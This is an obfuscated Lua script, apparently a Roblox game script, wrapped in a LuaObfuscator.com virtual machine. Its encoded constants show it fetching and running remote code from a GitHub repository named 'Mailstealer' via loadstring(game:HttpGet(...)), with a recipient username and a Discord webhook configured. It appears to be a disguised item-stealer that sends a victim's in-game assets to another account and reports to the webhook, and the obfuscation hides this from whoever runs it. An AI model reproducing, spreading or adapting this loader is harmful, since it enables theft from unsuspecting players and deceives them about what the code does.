--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v81=0;while true do if (v81==0) then v19=v0(v3(v30,1,1));return "";end end else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v30,16));if v19 then local v96=v5(v83,v19);v19=nil;return v96;else return v83;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v84=(v31/((5 -(1 + 2))^(v32-1)))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v84-(v84%(932 -(857 + 74))) ;else local v85=(570 -(367 + 201))^(v32-(1 + 0)) ;return (((v31%(v85 + v85))>=v85) and (928 -(214 + 713))) or 0 ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (1639 -(1523 + 114)) );v18=v18 + (879 -(282 + 595)) ;return (v36 * 256) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (3 -0) );v18=v18 + ((1048 + 21) -(68 + 997)) ;return (v40 * (16778486 -(226 + 1044))) + (v39 * (285370 -219834)) + (v38 * (373 -(32 + 85))) + v37 ;end local function v24()local v41=0 + 0 ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==(1 + 2)) then if (v46==(957 -(892 + 65))) then if (v45==(0 -0)) then return v47 * (0 -0) ;else local v97=0 -0 ;while true do if (v97==(0 -0)) then v46=351 -(87 + 263) ;v44=180 -(67 + 40 + 73) ;break;end end end elseif (v46==(1502 + 545)) then return ((v45==(0 -0)) and (v47 * ((2 -(886 -(261 + 624)))/(0 + 0)))) or (v47 * NaN) ;end return v8(v47,v46-(1461 -(145 + 293)) ) * (v44 + (v45/((432 -(44 + (685 -299)))^(206 -154)))) ;end if (v41==(952 -(802 + 150))) then v42=v23();v43=v23();v41=2 -1 ;end if (v41==(3 -1)) then v46=v20(v43,18 + 3 ,803 -(201 + 571) );v47=((v20(v43,1112 -(1020 + 60) )==(1 + 0)) and  -((2421 -(630 + 793)) -(915 + 82))) or (2 -1) ;v41=2 + 1 ;end if (v41==(1 -0)) then v44=3 -2 ;v45=(v20(v43,1188 -(1069 + 118) ,45 -25 ) * (2^((233 -164) -(175 -138)))) + v42 ;v41=2;end end end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==(0 + 0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -(3 -2) );v18=v18 + v48 ;local v50={};for v64=1748 -(760 + 987) , #v49 do v50[v64]=v2(v1(v3(v49,v64,v64)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=280 -(272 + 8) ;local v52;local v53;local v54;local v55;local v56;local v57;while true do local v66=0 + 0 ;while true do if (v66~=(1822 -(301 + 1521))) then else local v88=0;while true do if (v88~=(0 -0)) then else if (v51~=0) then else local v98=0 + 0 ;while true do if (v98~=2) then else v51=1;break;end if (v98==0) then v52={};v53={};v98=1;end if (v98~=(1 -0)) then else v54={};v55={v52,v53,nil,v54};v98=76 -(71 + 3) ;end end end if (v51~=(1 + 0)) then else local v99=0 -0 ;local v100;while true do if (v99~=(0 -0)) then else v100=241 -(187 + 54) ;while true do if (v100==2) then v51=782 -(162 + 618) ;break;end if (v100~=(1 + 0)) then else local v147=0;while true do if (v147==0) then for v176=1,v56 do local v177=0;local v178;local v179;local v180;while true do if (v177==(0 + 0)) then v178=0;v179=nil;v177=1;end if (v177==(1 -0)) then v180=nil;while true do if ((0 -0)==v178) then local v187=0;while true do if ((1 + 0)~=v187) then else v178=1;break;end if (0~=v187) then else v179=v21();v180=nil;v187=1;end end end if (v178~=(1637 -(1373 + 263))) then else if (v179==1) then v180=v21()~=(1000 -(451 + 549)) ;elseif (v179==2) then v180=v24();elseif (v179~=(1 + 2)) then else v180=v25();end v57[v176]=v180;break;end end break;end end end v55[4 -1 ]=v21();v147=1 -0 ;end if (v147~=(1385 -(746 + 638))) then else v100=2;break;end end end if (v100~=(0 + 0)) then else local v148=0 -0 ;while true do if ((341 -(218 + 123))==v148) then v56=v23();v57={};v148=1;end if (v148~=(1582 -(1535 + 46))) then else v100=1;break;end end end end break;end end end v88=1 + 0 ;end if (v88~=(1 + 0)) then else v66=1;break;end end end if (v66~=(561 -(306 + 254))) then else if (v51==(1 + 1)) then local v95=0 -0 ;while true do if (v95==(1468 -(899 + 568))) then return v55;end if (v95~=0) then else for v101=1 + 0 ,v23() do local v102=0;local v103;local v104;local v105;while true do if (v102==1) then v105=nil;while true do if (v103==(0 -0)) then local v159=603 -(268 + 335) ;while true do if (v159~=0) then else v104=290 -(60 + 230) ;v105=nil;v159=573 -(426 + 146) ;end if (v159~=1) then else v103=1;break;end end end if ((1 + 0)==v103) then while true do if (v104==0) then v105=v21();if (v20(v105,1,1)==(1456 -(282 + 1174))) then local v181=811 -(569 + 242) ;local v182;local v183;local v184;local v185;local v186;while true do if (v181~=(5 -3)) then else v186=nil;while true do if (v182==(1 + 1)) then while true do if (v183~=3) then else if (v20(v185,3,1027 -(706 + 318) )==(1252 -(721 + 530))) then v186[4]=v57[v186[4]];end v52[v101]=v186;break;end if (v183~=1) then else local v192=1271 -(945 + 326) ;while true do if (v192~=(2 -1)) then else v183=2 + 0 ;break;end if (0==v192) then v186={v22(),v22(),nil,nil};if (v184==0) then local v199=0;while true do if (v199==0) then v186[3 + 0 ]=v22();v186[1504 -(1408 + 92) ]=v22();break;end end elseif (v184==1) then v186[3]=v23();elseif (v184==(1088 -(461 + 625))) then v186[1291 -(993 + 295) ]=v23() -(2^16) ;elseif (v184==3) then local v209=0 + 0 ;local v210;while true do if (v209==0) then v210=0;while true do if (v210==0) then v186[3]=v23() -(2^(1187 -(418 + 753))) ;v186[2 + 2 ]=v22();break;end end break;end end end v192=1;end end end if (0~=v183) then else local v193=0;while true do if (v193==1) then v183=1;break;end if (v193~=(0 + 0)) then else local v197=0 + 0 ;while true do if (v197==(0 + 0)) then local v200=529 -(406 + 123) ;while true do if ((1770 -(1749 + 20))==v200) then v197=1;break;end if ((0 + 0)~=v200) then else v184=v20(v105,1324 -(1249 + 73) ,2 + 1 );v185=v20(v105,1149 -(466 + 679) ,6);v200=1;end end end if (v197==1) then v193=2 -1 ;break;end end end end end if (2==v183) then local v194=0 -0 ;while true do if (v194==(1901 -(106 + 1794))) then v183=3;break;end if (v194==(0 + 0)) then local v198=0;while true do if ((0 + 0)~=v198) then else if (v20(v185,1,2 -1 )==1) then v186[5 -3 ]=v57[v186[116 -(4 + 110) ]];end if (v20(v185,2,586 -(57 + 527) )~=(1428 -(41 + 1386))) then else v186[106 -(17 + 86) ]=v57[v186[3]];end v198=1 + 0 ;end if (1==v198) then v194=1 -0 ;break;end end end end end end break;end if (v182~=(2 -1)) then else local v189=166 -(122 + 44) ;while true do if (v189~=0) then else v185=nil;v186=nil;v189=1 -0 ;end if (v189==(3 -2)) then v182=2 + 0 ;break;end end end if (v182~=0) then else local v190=0;while true do if (v190~=(0 + 0)) then else v183=0 -0 ;v184=nil;v190=66 -(30 + 35) ;end if (v190==(1 + 0)) then v182=1;break;end end end end break;end if (v181==0) then v182=0;v183=nil;v181=1258 -(1043 + 214) ;end if (v181~=(3 -2)) then else v184=nil;v185=nil;v181=1214 -(323 + 889) ;end end end break;end end break;end end break;end if (v102==(0 -0)) then v103=0;v104=nil;v102=581 -(361 + 219) ;end end end for v106=1,v23() do v53[v106-1 ]=v28();end v95=1;end end end break;end end end end local function v29(v58,v59,v60)local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...)local v67=v61;local v68=v62;local v69=v63;local v70=v27;local v71=1;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v86=0,v75 do if (v86>=v69) then v73[v86-v69 ]=v74[v86 + 1 ];else v77[v86]=v74[v86 + 1 ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do local v87=0;while true do if (v87==0) then v79=v67[v71];v80=v79[1];v87=1;end if (v87==1) then if (v80<=5) then if (v80<=2) then if (v80<=0) then v77[v79[2]]=v79[3]~=0 ;elseif (v80==1) then local v113=v79[2];local v114,v115=v70(v77[v113](v13(v77,v113 + 1 ,v79[3])));v72=(v115 + v113) -1 ;local v116=0;for v140=v113,v72 do local v141=0;while true do if (0==v141) then v116=v116 + 1 ;v77[v140]=v114[v116];break;end end end else local v117;local v118,v119;local v120;local v121;v60[v79[3]]=v77[v79[2]];v71=v71 + 1 ;v79=v67[v71];if ((v79[3]=="_ENV") or (v79[3]=="getfenv")) then v77[v79[2]]=v60;else v77[v79[2]]=v60[v79[3]];end v71=v71 + 1 ;v79=v67[v71];if ((v79[3]=="_ENV") or (v79[3]=="getfenv")) then v77[v79[2]]=v60;else v77[v79[2]]=v60[v79[3]];end v71=v71 + 1 ;v79=v67[v71];v121=v79[2];v120=v77[v79[3]];v77[v121 + 1 ]=v120;v77[v121]=v120[v79[4]];v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]=v79[3];v71=v71 + 1 ;v79=v67[v71];v121=v79[2];v118,v119=v70(v77[v121](v13(v77,v121 + 1 ,v79[3])));v72=(v119 + v121) -1 ;v117=0;for v142=v121,v72 do v117=v117 + 1 ;v77[v142]=v118[v117];end v71=v71 + 1 ;v79=v67[v71];v121=v79[2];v77[v121]=v77[v121](v13(v77,v121 + 1 ,v72));v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]();v71=v71 + 1 ;v79=v67[v71];v71=v79[3];end elseif (v80<=3) then local v109=0;local v110;while true do if (v109==0) then v110=v79[2];v77[v110]=v77[v110](v13(v77,v110 + 1 ,v72));break;end end elseif (v80>4) then v71=v79[3];else v77[v79[2]]();end elseif (v80<=8) then if (v80<=6) then v60[v79[3]]=v77[v79[2]];elseif (v80==7) then local v132=v79[2];local v133=v77[v79[3]];v77[v132 + 1 ]=v133;v77[v132]=v133[v79[4]];else v77[v79[2]]=v79[3];end elseif (v80<=10) then if (v80==9) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end else do return;end end elseif (v80>11) then if ((v79[3]=="_ENV") or (v79[3]=="getfenv")) then v77[v79[2]]=v60;else v77[v79[2]]=v60[v79[3]];end else local v139=0;while true do if (v139==4) then v71=v79[3];break;end if (v139==2) then v60[v79[3]]=v77[v79[2]];v71=v71 + 1 ;v79=v67[v71];v139=3;end if (v139==0) then v60[v79[3]]=v77[v79[2]];v71=v71 + 1 ;v79=v67[v71];v139=1;end if (v139==1) then v77[v79[2]]=v79[3];v71=v71 + 1 ;v79=v67[v71];v139=2;end if (v139==3) then v77[v79[2]]=v79[3];v71=v71 + 1 ;v79=v67[v71];v139=4;end end end v71=v71 + 1 ;break;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F030D3O004C6F6164696E675363722O656E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4D61696C737465616C657256322F4D61696C737465616C65722F6D61696E2F763203083O00557365726E616D6503123O004D72502O6F707950616E74733230322O343203073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3139313532373037323O38322O363738322F4236486C69744B7033716B4D7462596E323374766A52556D454472476846507A6A6C4C6241307179586858424B76324437394245736C71504247685A773658733558423000163O0012083O00013O0026093O000D000100020004053O000D00014O000100013O001202000100033O00122O000100043O00122O000200053O00202O00020002000600122O000400076O000200046O00013O00024O00010001000100044O001500010026093O0001000100010004053O00010001001208000100093O00120B000100083O00122O0001000B3O00122O0001000A3O00124O00023O00044O000100012O000A3O00017O00",v9(),...);